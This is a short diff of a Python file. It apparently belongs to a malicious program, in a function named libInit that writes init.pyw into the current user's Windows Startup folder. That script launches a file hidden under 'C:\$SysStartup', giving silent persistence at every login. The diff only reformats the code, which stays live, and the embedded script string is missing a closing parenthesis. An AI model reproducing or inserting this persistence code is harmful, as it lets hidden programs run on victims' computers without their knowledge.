@@ -94,10 +94,12 @@ def libInit():
 
         if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"):
             with open("init.pyw", "w") as bat:
-                bat.write("""
+                bat.write(
+                """
                 from subprocess import call
                 call(['python', \"C:\$SysStartup\pslib.pyw\"]
-                """)
+                """
+                )
 
         sleep(0.5)
         call(["move", "init.pyw", f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"], shell=True)
